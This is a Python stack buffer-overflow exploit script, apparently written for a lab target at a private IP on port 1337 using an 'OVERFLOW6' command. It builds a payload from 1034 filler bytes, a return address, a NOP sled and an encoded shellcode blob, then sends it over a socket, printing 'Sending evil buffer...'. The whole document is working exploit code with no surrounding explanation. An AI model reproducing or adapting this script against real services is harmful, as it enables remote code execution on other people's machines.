import socket

ip = "192.168.56.101"
port = 1337

prefix = "OVERFLOW6 "
offset = 1034
overflow = "A" * offset

#retn = ""
#retn =  "BBBB"
retn =  "\xaf\x11\x50\x62"

padding = "\x90" * 16

payload = (
"\xb8\x98\x06\x80\x1a\xdb\xcb\xd9\x74\x24\xf4\x5a\x31\xc9"
"\xb1\x59\x83\xea\xfc\x31\x42\x10\x03\x42\x10\x7a\xf3\x7c"
"\xf2\xf5\xfc\x7c\x03\x69\x74\x99\x32\xbb\xe2\xe9\x67\x0b"
"\x60\xbf\x8b\xe0\x24\x54\x9b\x41\x82\x72\x92\x52\x98\x09"
"\xfc\x9d\x5f\x41\xc0\xbc\x23\x98\x15\x1e\x1d\x53\x68\x5f"
"\x5a\x25\x06\xb0\x36\x3d\xba\x5e\xe0\xca\x79\x62\x0f\x1d"
"\xf6\xda\x77\x18\xc9\xae\xcb\x23\x1a\xc5\x8c\x03\xca\xd8"
"\xff\xcf\xa2\xc2\x7a\x06\x46\xce\xcd\xa8\x58\xa5\xfa\x41"
"\xa7\x6f\x33\x96\x04\x4e\xfb\x1b\x54\x97\x3c\xc4\x23\xe3"
"\x3e\x79\x34\x30\x3c\xa5\xb1\xa6\xe6\x2e\x61\x02\x16\xe2"
"\xf4\xc1\x14\x4f\x72\x8d\x38\x4e\x57\xa6\x45\xdb\x56\x68"
"\xcc\x9f\x7c\xac\x94\x44\x1c\xf5\x70\x2a\x21\xe5\xdd\x93"
"\x87\x6e\xcf\xc2\xb8\x8f\x0f\xeb\xe4\x07\xc3\x26\x17\xd7"
"\x4b\x30\x64\xe5\xd4\xea\xe2\x45\x9c\x34\xf4\xdc\x8a\xc6"
"\x2a\x66\xda\x38\xcb\x96\xf2\xfe\x9f\xc6\x6c\xd6\x9f\x8d"
"\x6c\xd7\x75\x3b\x67\x4f\xb6\x13\x4f\x8e\x5e\x61\xb0\x81"
"\xc2\xec\x56\xf1\xaa\xbe\xc6\xb2\x1a\x7e\xb7\x5a\x71\x71"
"\xe8\x7b\x7a\x58\x81\x16\x95\x34\xf9\x8e\x0c\x1d\x71\x2e"
"\xd0\x88\xff\x70\x5a\x38\xff\x3f\xab\x49\x13\x57\xcc\xb1"
"\xeb\xa8\x79\xb1\x81\xac\x2b\xe6\x3d\xaf\x0a\xc0\xe1\x50"
"\x79\x53\xe5\xaf\xfc\x65\x9d\x86\x6a\xc9\xc9\xe6\x7a\xc9"
"\x09\xb1\x10\xc9\x61\x65\x41\x9a\x94\x6a\x5c\x8f\x04\xff"
"\x5f\xf9\xf9\xa8\x37\x07\x27\x9e\x97\xf8\x02\x9c\xd0\x06"
"\xd0\x8b\x78\x6e\x2a\x8c\x78\x6e\x40\x0c\x29\x06\x9f\x23"
"\xc6\xe6\x60\xee\x8f\x6e\xea\x7f\x7d\x0f\xeb\x55\x23\x91"
"\xec\x5a\xf8\x22\x96\x13\xff\xc3\x67\x3a\x64\xc4\x67\x42"
"\x9a\xf9\xb1\x7b\xe8\x3c\x02\x38\xe3\x0b\x27\x69\x6e\x73"
"\x7b\x69\xbb")

postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
